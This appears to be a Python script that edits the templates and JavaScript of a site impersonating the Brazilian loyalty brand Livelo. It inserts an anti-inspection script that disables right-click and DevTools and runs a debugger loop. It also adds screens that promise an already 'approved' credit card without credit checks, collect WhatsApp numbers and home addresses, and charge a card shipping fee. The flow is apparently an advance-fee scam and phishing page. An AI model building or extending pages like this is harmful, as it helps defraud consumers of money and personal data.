import os

html_path = r"d:\Paginas ADS\Livelo\templates\index.html"
js_path = r"d:\Paginas ADS\Livelo\static\js\main.js"

with open(html_path, "r", encoding="utf-8") as f:
    html = f.read()

# Anti-copy script
anti_copy = """
<!-- SECURITY BLINDAGE -->
<script>
document.addEventListener('contextmenu', event => event.preventDefault());
document.onkeydown = function(e) {
  if(e.keyCode == 123) return false;
  if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
};
setInterval(function(){debugger;}, 1000);
</script>
"""
if "SECURITY BLINDAGE" not in html:
    html = html.replace("<head>", "<head>\n" + anti_copy)


# New Screens based on screenshots
# 1. Screen Priority
screen_priority = """
<!-- ═══════ PRIORITY ═══════ -->
<div class="screen" id="screen-priority">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
</div>
<div class="step-card funnel-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.15rem;margin-bottom:24px;line-height:1.4">O que é mais importante para você em um cartão de crédito?</h2>
<div class="choice-grid-2" style="gap:16px">
<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:20px 10px;border-radius:12px;border:2px solid var(--pink);background:transparent;color:var(--text);font-size:0.9rem;font-weight:600;display:flex;flex-direction:column;align-items:center;gap:12px">
<svg fill="#E5147A" height="32" viewBox="0 0 24 24" width="32"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.67v-1.93c-1.71-.36-3.16-1.46-3.27-3.4h1.96c.1 1.05.82 1.87 2.65 1.87 1.96 0 2.4-.98 2.4-1.59 0-.83-.44-1.61-2.67-2.14-2.48-.6-4.18-1.62-4.18-3.67 0-1.72 1.39-2.84 3.11-3.21V4h2.67v1.95c1.86.45 2.79 1.86 2.85 3.39H14.3c-.05-1.11-.64-1.87-2.22-1.87-1.5 0-2.4.68-2.4 1.64 0 .84.65 1.39 2.67 1.91 2.84.7 4.18 1.75 4.18 3.86 0 1.91-1.47 2.94-3.12 3.21z"/></svg>
Limite alto
</button>
<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:20px 10px;border-radius:12px;border:2px solid var(--pink);background:transparent;color:var(--text);font-size:0.9rem;font-weight:600;display:flex;flex-direction:column;align-items:center;gap:12px">
<svg fill="#E5147A" height="32" viewBox="0 0 24 24" width="32"><path d="M13.13 22.19L11.5 18.36C10.07 18.78 8.45 18.78 7.02 18.36L5.39 22.19C5.1 22.87 4.3 23.2 3.61 22.92C2.93 22.63 2.6 21.84 2.88 21.16L4.52 17.33C2.88 15.34 2.02 12.83 2.02 10.14C2.02 4.54 6.56 0 12.16 0C17.76 0 22.3 4.54 22.3 10.14C22.3 12.83 21.44 15.34 19.8 17.33L21.44 21.16C21.73 21.84 21.39 22.63 20.71 22.92C20.02 23.2 19.22 22.87 18.94 22.19L17.31 18.36C15.88 18.78 14.26 18.78 12.83 18.36L11.2 22.19C10.91 22.87 10.12 23.2 9.43 22.92C8.75 22.63 8.42 21.84 8.7 21.16L10.33 17.33C10.74 17.21 11.16 17.06 11.58 16.89C11.96 16.74 12.33 16.57 12.7 16.38L11.07 20.21C10.78 20.89 11.12 21.68 11.8 21.97C12.48 22.25 13.28 21.92 13.56 21.24L15.19 17.41C16.62 16.99 17.9 16.29 18.94 15.36L17.31 19.19C17.02 19.87 17.36 20.66 18.04 20.95C18.73 21.23 19.53 20.9 19.81 20.22L21.44 16.39C22.25 14.54 22.7 12.43 22.7 10.14C22.7 4.54 18.16 0 12.56 0C6.96 0 2.42 4.54 2.42 10.14C2.42 12.43 2.87 14.54 3.68 16.39L5.31 20.22C5.59 20.9 5.26 21.69 4.57 21.97C3.89 22.26 3.1 21.92 2.81 21.24L1.18 17.41C0.14 16.29 -0.42 14.86 -0.73 13.25L0.9 17.08C1.19 17.76 1.98 18.1 2.67 17.81C3.35 17.53 3.68 16.74 3.4 16.06L1.77 12.23C1.65 11.56 1.62 10.86 1.62 10.14C1.62 4.54 6.16 0 11.76 0C17.36 0 21.9 4.54 21.9 10.14C21.9 10.86 21.87 11.56 21.75 12.23L20.12 16.06C19.83 16.74 20.17 17.53 20.85 17.81C21.54 18.1 22.33 17.76 22.62 17.08L24.25 13.25C23.94 14.86 23.38 16.29 22.34 17.41L20.71 21.24C20.42 21.92 19.63 22.26 18.94 21.97C18.26 21.69 17.92 20.9 18.21 20.22L19.84 16.39C20.65 14.54 21.1 12.43 21.1 10.14C21.1 4.54 16.56 0 10.96 0C5.36 0 0.82 4.54 0.82 10.14C0.82 12.43 1.27 14.54 2.08 16.39L3.71 20.22C4 20.9 3.66 21.69 2.98 21.97C2.29 22.26 1.5 21.92 1.21 21.24L-0.42 17.41C-1.46 16.29 -2.02 14.86 -2.33 13.25L-0.7 17.08C-0.41 17.76 0.38 18.1 1.07 17.81C1.75 17.53 2.08 16.74 1.8 16.06L0.17 12.23C0.05 11.56 0.02 10.86 0.02 10.14C0.02 4.54 4.56 0 10.16 0C15.76 0 20.3 4.54 20.3 10.14C20.3 10.86 20.27 11.56 20.15 12.23L18.52 16.06C18.23 16.74 18.57 17.53 19.25 17.81C19.94 18.1 20.73 17.76 21.02 17.08L22.65 13.25C22.34 14.86 21.78 16.29 20.74 17.41L19.11 21.24C18.82 21.92 18.03 22.26 17.34 21.97C16.66 21.69 16.32 20.9 16.61 20.22L18.24 16.39C19.05 14.54 19.5 12.43 19.5 10.14C19.5 4.54 14.96 0 9.36 0C3.76 0 -0.78 4.54 -0.78 10.14C-0.78 12.43 -0.33 14.54 0.48 16.39L2.11 20.22C2.4 20.9 2.06 21.69 1.38 21.97C0.69 22.26 -0.1 21.92 -0.39 21.24L-2.02 17.41C-3.06 16.29 -3.62 14.86 -3.93 13.25"/></svg>
Crédito imediato
</button>
<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:20px 10px;border-radius:12px;border:2px solid var(--pink);background:transparent;color:var(--text);font-size:0.9rem;font-weight:600;display:flex;flex-direction:column;align-items:center;gap:12px">
<svg fill="#E5147A" height="32" viewBox="0 0 24 24" width="32"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.31C15.55 19.37 13.85 20 12 20zm6.31-3.1L7.1 5.69C8.45 4.63 10.15 4 12 4c4.42 0 8 3.58 8 8 0 1.85-.63 3.55-1.69 4.9z"/></svg>
Não consultar SPC/Serasa
</button>
<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:20px 10px;border-radius:12px;border:2px solid var(--pink);background:transparent;color:var(--text);font-size:0.9rem;font-weight:600;display:flex;flex-direction:column;align-items:center;gap:12px">
<svg fill="#E5147A" height="32" viewBox="0 0 24 24" width="32"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20a2 2 0 0 0 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/></svg>
Sem anuidade
</button>
</div>
</div>
<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2026 · Todos os direitos reservados</p>
</footer>
</div>
</div>

<!-- ═══════ MANAGER ═══════ -->
<div class="screen" id="screen-manager">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
</div>
<div class="step-card funnel-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:8px">Ótimo, quase lá!</h2>
<p class="step-sub" style="font-size:0.85rem;color:var(--text-muted);margin-bottom:24px;line-height:1.5">Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!</p>

<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:24px;text-align:center;margin-bottom:24px">
<div style="width:80px;height:80px;border-radius:50%;margin:0 auto 12px;background:url('/static/images/manager.jpg') center/cover;border:3px solid var(--pink)"></div>
<div style="font-size:0.85rem;color:var(--text-muted);margin-bottom:4px">Gerente</div>
<div style="font-size:1.1rem;font-weight:700;color:var(--text);margin-bottom:12px" id="manager-name">Juliana Benedito</div>
<div style="background:var(--pink);color:white;font-size:0.75rem;font-weight:700;padding:6px 16px;border-radius:20px;display:inline-flex;align-items:center;gap:6px">
<svg fill="white" height="14" viewBox="0 0 24 24" width="14"><path d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.94A5.01 5.01 0 0 0 11 15.9V19H7v2h10v-2h-4v-3.1a5.01 5.01 0 0 0 3.61-2.96C19.08 12.63 21 10.55 21 8V7c0-1.1-.9-2-2-2zM5 8V7h2v3.82C5.84 10.4 5 9.3 5 8zm14 0c0 1.3-.84 2.4-2 2.82V7h2v1z"/></svg>
Melhor gerente 2023-2024
</div>
</div>

<div class="input-group" style="margin-bottom:24px;position:relative">
<svg fill="#10B981" height="20" style="position:absolute;left:16px;top:50%;transform:translateY(-50%)" viewBox="0 0 24 24" width="20"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>
<input type="text" id="input-whatsapp" class="input-field" placeholder="Digite seu WhatsApp aqui" style="padding-left:44px" oninput="mascaraTel(this)" maxlength="15">
</div>
<button class="btn-primary" onclick="submitWhatsapp()" style="margin-top:0">Continuar →</button>
</div>
<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2026 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""

# 2. Add New Forms to replace screen-cep (Address Form) and Shipping Method
screen_address_full = """
<!-- ═══════ ENDEREÇO COMPLETO ═══════ -->
<div class="screen" id="screen-cep">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
</div>
<div class="step-card funnel-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:8px">Endereço de Entrega</h2>
<p class="step-sub" style="font-size:0.85rem;color:var(--text-muted);margin-bottom:24px">Onde você deseja receber seu cartão</p>

<div class="input-group" style="margin-bottom:12px">
<label class="input-label" style="text-align:left;font-size:0.75rem">CEP</label>
<input type="text" id="input-cep" class="input-field" placeholder="00000-000" maxlength="9" oninput="mascaraCep(this)" onblur="buscarCepBlur()" style="text-align:left">
</div>

<div class="input-group" style="margin-bottom:12px">
<label class="input-label" style="text-align:left;font-size:0.75rem">Endereço</label>
<input type="text" id="input-rua" class="input-field">
</div>

<div style="display:flex;gap:12px;margin-bottom:12px">
<div class="input-group" style="flex:1">
<label class="input-label" style="text-align:left;font-size:0.75rem">Número</label>
<input type="text" id="input-numero" class="input-field">
</div>
<div class="input-group" style="flex:1">
<label class="input-label" style="text-align:left;font-size:0.75rem">Complemento</label>
<input type="text" id="input-complemento" class="input-field">
</div>
</div>

<div class="input-group" style="margin-bottom:12px">
<label class="input-label" style="text-align:left;font-size:0.75rem">Bairro</label>
<input type="text" id="input-bairro" class="input-field">
</div>

<div style="display:flex;gap:12px;margin-bottom:24px">
<div class="input-group" style="flex:2">
<label class="input-label" style="text-align:left;font-size:0.75rem">Cidade</label>
<input type="text" id="input-cidade" class="input-field">
</div>
<div class="input-group" style="flex:1">
<label class="input-label" style="text-align:left;font-size:0.75rem">Estado</label>
<select id="input-estado" class="input-field" style="appearance:none">
<option value="">Selecione</option>
<option value="SP">SP</option><option value="RJ">RJ</option><option value="MG">MG</option>
<option value="RS">RS</option><option value="PR">PR</option><option value="SC">SC</option>
<option value="BA">BA</option><option value="PE">PE</option><option value="CE">CE</option>
<option value="GO">GO</option><option value="DF">DF</option><option value="AM">AM</option>
<option value="PA">PA</option><option value="MT">MT</option><option value="MS">MS</option>
<option value="ES">ES</option><option value="MA">MA</option><option value="PB">PB</option>
<option value="RN">RN</option><option value="AL">AL</option><option value="PI">PI</option>
<option value="SE">SE</option><option value="RO">RO</option><option value="TO">TO</option>
<option value="AC">AC</option><option value="AP">AP</option><option value="RR">RR</option>
</select>
</div>
</div>

<div class="error-msg hidden" id="cep-error"></div>
<button class="btn-primary" onclick="submitAddress()" style="margin-top:0">Continuar →</button>
</div>
<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2026 · Todos os direitos reservados</p>
</footer>
</div>
</div>

<!-- ═══════ SHIPPING METHOD ═══════ -->
<div class="screen" id="screen-shipping-method">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
</div>
<div class="step-card funnel-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:8px">Escolha o método de envio</h2>
<p class="step-sub" style="font-size:0.85rem;color:var(--text-muted);margin-bottom:24px;line-height:1.5">Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong style="color:var(--pink)">APROVADO</strong></p>

<div style="display:flex;flex-direction:column;gap:12px">
<button class="shipping-btn" onclick="selectShipping('SEDEX', 29.90)" style="display:flex;align-items:center;justify-content:space-between;padding:20px;border:1px solid #E5E7EB;border-radius:12px;background:white;cursor:pointer;text-align:left">
<div style="display:flex;align-items:center;gap:16px">
<span style="font-size:24px">📦</span>
<div>
<div style="font-weight:700;color:var(--text);font-size:0.95rem">SEDEX</div>
<div style="font-size:0.75rem;color:var(--text-muted)">1 dia útil</div>
</div>
</div>
<div style="font-weight:800;color:var(--pink);font-size:1.1rem">R$ 29,90</div>
</button>

<button class="shipping-btn" onclick="selectShipping('PAC', 24.30)" style="display:flex;align-items:center;justify-content:space-between;padding:20px;border:1px solid #E5E7EB;border-radius:12px;background:white;cursor:pointer;text-align:left">
<div style="display:flex;align-items:center;gap:16px">
<span style="font-size:24px">📬</span>
<div>
<div style="font-weight:700;color:var(--text);font-size:0.95rem">PAC</div>
<div style="font-size:0.75rem;color:var(--text-muted)">17-20 dias úteis</div>
</div>
</div>
<div style="font-weight:800;color:var(--pink);font-size:1.1rem">R$ 24,30</div>
</button>
</div>

</div>
<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2026 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""

# Replace in HTML
# 1. First, we need to locate screen-income or screen-motivo to insert screen-priority, but the user wants priority first?
# The flow according to images: Priority -> Income -> ... -> Manager -> Address -> Shipping Method -> Shipping Success

# We will just inject these screens before screen-income
if "id=\"screen-priority\"" not in html:
    html = html.replace('<!-- ═══════ RENDA ═══════ -->', screen_priority + '\n<!-- ═══════ RENDA ═══════ -->')

# Replace the old screen-cep (if exists) with the new one, and inject manager & shipping-method before it
import re
if "id=\"screen-manager\"" not in html:
    # Remove old screen-cep
    html = re.sub(r'<!-- ═══════ LOCALIZAÇÃO / CEP ═══════ -->.*?<footer class="funnel-footer">.*?</footer>\s*</div>\s*</div>', '', html, flags=re.DOTALL)
    
    html = html.replace('<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->', screen_address_full + '\n<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->')


with open(html_path, "w", encoding="utf-8") as f:
    f.write(html)

with open(js_path, "r", encoding="utf-8") as f:
    js = f.read()

# Update JS Logic for the new screens
js_updates = """
// Novas funções para o fluxo
function mascaraTel(i) {
  let v = i.value.replace(/\\D/g, '');
  if (v.length > 11) v = v.slice(0,11);
  if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
  if (v.length > 9) v = `${v.slice(0,9)}-${v.slice(9)}`;
  i.value = v;
}

async function buscarCepBlur() {
  const cep = $id('input-cep').value.replace(/\\D/g, '');
  if (cep.length !== 8) return;
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (!data.erro) {
      $id('input-rua').value = data.logradouro;
      $id('input-bairro').value = data.bairro;
      $id('input-cidade').value = data.localidade;
      $id('input-estado').value = data.uf;
      STATE.cep = data.cep;
      STATE.rua = data.logradouro;
      STATE.bairro = data.bairro;
      STATE.cidade = data.localidade;
      STATE.uf = data.uf;
    }
  } catch(e) {}
}

function submitAddress() {
  STATE.cep = $id('input-cep').value;
  STATE.rua = $id('input-rua').value;
  STATE.numero = $id('input-numero').value;
  STATE.complemento = $id('input-complemento').value;
  STATE.bairro = $id('input-bairro').value;
  STATE.cidade = $id('input-cidade').value;
  STATE.uf = $id('input-estado').value;
  
  if(!STATE.cep || !STATE.rua || !STATE.numero || !STATE.bairro || !STATE.cidade || !STATE.uf) {
      return showErr('cep-error', 'Preencha todos os campos obrigatórios.');
  }
  
  const fullRua = `${STATE.rua}, ${STATE.numero}` + (STATE.complemento ? ` - ${STATE.complemento}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  if($id('display-rua')) $id('display-rua').innerText = fullRua;
  if($id('sum-rua')) $id('sum-rua').innerText = fullRua;
  if($id('display-bairro')) $id('display-bairro').innerText = fullBairro;
  if($id('sum-bairro')) $id('sum-bairro').innerText = fullBairro;
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  goToStep('shipping-method');
}

function selectShipping(method, price) {
  STATE.shippingMethod = method;
  STATE.shippingPrice = price;
  goToStep('shipping-success');
}
"""

if "buscarCepBlur" not in js:
    js = js + "\n" + js_updates

# Routing in JS
js = js.replace("goToStep('income');", "goToStep('priority');")
js = js.replace("goToStep('cep'); // Redirects to new CEP step", "goToStep('cep');")

with open(js_path, "w", encoding="utf-8") as f:
    f.write(js)

print("Screens added successfully")
